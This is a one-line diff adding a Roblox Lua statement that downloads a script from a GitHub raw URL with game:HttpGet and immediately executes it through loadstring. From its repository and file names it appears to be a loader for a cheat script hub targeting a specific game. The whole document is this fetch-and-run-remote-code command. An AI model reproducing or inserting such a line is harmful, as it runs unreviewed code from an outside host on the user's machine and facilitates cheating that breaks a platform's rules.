@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/make-ramen-to-get-rich-release-spam7-ekb2dgi7gzgbf2.lua"))()
